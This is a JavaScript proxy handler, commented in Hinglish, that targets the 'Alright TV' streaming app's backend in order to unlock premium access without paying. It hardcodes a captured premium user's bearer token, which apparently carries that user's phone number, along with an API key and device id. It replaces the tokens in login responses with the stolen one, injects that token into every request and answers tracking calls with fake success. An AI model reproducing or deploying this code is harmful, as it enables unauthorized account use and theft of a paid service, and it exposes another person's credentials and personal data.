// ==========================================
// 📡 ALRIGHT TV PROXY — PREMIUM TOKEN INJECT
// ==========================================

const BASE_URL = "https://alright-prod-b4argqfwfdfpezfc.centralindia-01.azurewebsites.net";

// 🔥 TERA PREMIUM TOKEN (jo capture mein mila)
const PREMIUM_TOKEN = "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjI0N2Y4MDYwMDM5YjVmNDBkOTQ5NjkzOGJiMTg5NzA2ZWY4ODkzM2QiLCJ0eXAiOiJKV1QifQ.eyJsb2dpblR5cGUiOjAsInVzZXJJZCI6IjZhNzMxMGNkNzJhNDhlZjkxYmJmOWE3NSIsInBob25lVmVyaWZpZWQiOnRydWUsInBob25lX251bWJlciI6Iis5MTkyMDUyMzEwNDIiLCJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vYWxyaWdodC0zYWRmZCIsImF1ZCI6ImFscmlnaHQtM2FkZmQiLCJhdXRoX3RpbWUiOjE3ODg1OTUwMDEsInVzZXJfaWQiOiJNTy0zNTU2NDNmYTc3YWU0ZDVlYWI2NDdjYWMzYjRkZjAxNCIsInN1YiI6Ik1PLTM1NTY0M2ZhNzdhZTRkNWVhYjY0N2NhYzNiNGRmMDE0IiwiaWF0IjoxNzg4NTk1MDAxLCJleHAiOjE3ODg1OTg2MDEsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.NTogk3P0OAnfoZ4w9PyadnbeyuitdMXgddgJEcB1a4vhhUQly5iAQzKcrPndNHoVG2Zd12JFrM8WldOAgNMHW4TV4NqV2agkXH-QqlVppJHFQvVCcvE6n73i51ow0zmjYhOz3KCba2UWNdGmhERgxjOJRCRWmTawYs7Ys3kHTxSjpHOxCk4gEoNeeHe3Ix2sQUwXRSa69O1hJNtBpjKKagB8181ZOo05yNfnhgW77b3CxT6KXVwLhAky91QycWhluZXQenfAMI9bSEzaxJudsPN6h7n5Hq95dvDe8VSIOXpLq7fGK18SwsElg1LB6vl6IuRhOd85KsfnnFiwAFruIA";

const INJECT_HEADERS = {
    "key": "26a1d8b05105f27f943b088a6e8c9cf035bde8479c437c24277cbfd214c4135b",
    "device-id": "9e9f95f096bd5c61",
    "app-version": "29.1.0",
    "platform": "android",
    "iscore": "yes",
    "accept": "application/json",
    "content-type": "application/json",
    "user-agent": "Dart/3.9 (dart:io)"
};

// 🚫 Block Tracking/Analytics
const BLOCKED_PATTERNS = [
    'sentry.io', 'firebaselogging', 'posthog', 'moengage',
    'otpless', 'clevertap', 'appsflyer', 'analytics',
    'events.otpless', 'firebaseinstallations'
];

// 🔥 Login Endpoints — yahan token replace karna hai
const LOGIN_ENDPOINTS = [
    '/user/otpless-login',
    '/user/login',
    '/auth/login',
    '/v1/auth/login'
];

export default async function handler(req, res) {
    let urlPath = req.headers['x-invoke-path'] || req.url;
    const cleanPath = urlPath.split('?')[0];
    const method = req.method;

    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');

    if (method === 'OPTIONS') {
        return res.status(200).end();
    }

    // 🚫 Block Tracking
    if (BLOCKED_PATTERNS.some(p => cleanPath.includes(p))) {
        return res.status(200).json({ status: true, message: "Blocked" });
    }

    try {
        const headers = { ...req.headers };

        // 🔥 INJECT HEADERS
        Object.keys(INJECT_HEADERS).forEach(key => {
            headers[key] = INJECT_HEADERS[key];
        });

        // ==========================================
        // 🎯 LOGIN REQUEST — TOKEN REPLACE
        // ==========================================
        const isLogin = LOGIN_ENDPOINTS.some(e => cleanPath.includes(e));
        
        if (isLogin) {
            // 🔥 Login request ko forward karo but response modify karo
            
            // Cleanup
            delete headers['accept-encoding'];
            delete headers['content-length'];
            delete headers['host'];
            delete headers['connection'];

            const fetchOptions = {
                method: method,
                headers: headers,
            };

            if (method !== 'GET' && method !== 'HEAD' && req.body) {
                if (typeof req.body === 'object') {
                    fetchOptions.body = JSON.stringify(req.body);
                } else {
                    fetchOptions.body = req.body;
                }
            }

            // ⚠️ Original login request bhejo (user ka OTP verify ho)
            const response = await fetch(BASE_URL + urlPath, fetchOptions);
            let data = await response.text();

            // 🔥🔥🔥 LOGIN RESPONSE MEIN TOKEN REPLACE
            try {
                let jsonData = JSON.parse(data);
                
                // 🎯 Token replace karo — user ka token hatake premium token daalo
                if (jsonData.token || jsonData.idToken || jsonData.accessToken) {
                    jsonData.token = PREMIUM_TOKEN;
                    jsonData.idToken = PREMIUM_TOKEN;
                    jsonData.accessToken = PREMIUM_TOKEN;
                }
                
                // 🎯 Authorization header bhi inject karo response mein
                jsonData.authorization = PREMIUM_TOKEN;
                
                data = JSON.stringify(jsonData);
                console.log("✅ TOKEN REPLACED! Premium token injected.");
            } catch (e) {
                // Agar JSON nahi hai toh raw response bhejo
                console.log("⚠️ Response not JSON, sending raw");
            }

            response.headers.forEach((value, key) => {
                if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key)) {
                    res.setHeader(key, value);
                }
            });

            return res.status(response.status).send(data);
        }

        // ==========================================
        // 🚀 NORMAL REQUEST — Premium Token Inject
        // ==========================================
        
        // 🔥 Har request mein premium token inject (authorization header)
        headers['authorization'] = PREMIUM_TOKEN;

        delete headers['accept-encoding'];
        delete headers['content-length'];
        delete headers['host'];
        delete headers['connection'];

        const fetchOptions = {
            method: method,
            headers: headers,
        };

        if (method !== 'GET' && method !== 'HEAD' && req.body) {
            if (typeof req.body === 'object') {
                fetchOptions.body = JSON.stringify(req.body);
            } else {
                fetchOptions.body = req.body;
            }
        }

        const response = await fetch(BASE_URL + urlPath, fetchOptions);
        const data = await response.text();

        // 🔥 Agar koi response mein token aata hai toh replace karo
        try {
            let jsonData = JSON.parse(data);
            if (jsonData.token || jsonData.idToken || jsonData.accessToken) {
                jsonData.token = PREMIUM_TOKEN;
                jsonData.idToken = PREMIUM_TOKEN;
                jsonData.accessToken = PREMIUM_TOKEN;
                data = JSON.stringify(jsonData);
                console.log("✅ Response token replaced!");
            }
        } catch (e) {
            // Ignore
        }

        response.headers.forEach((value, key) => {
            if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key)) {
                res.setHeader(key, value);
            }
        });

        return res.status(response.status).send(data);

    } catch (error) {
        return res.status(500).json({
            error: "Proxy Error: " + error.message
        });
    }
}
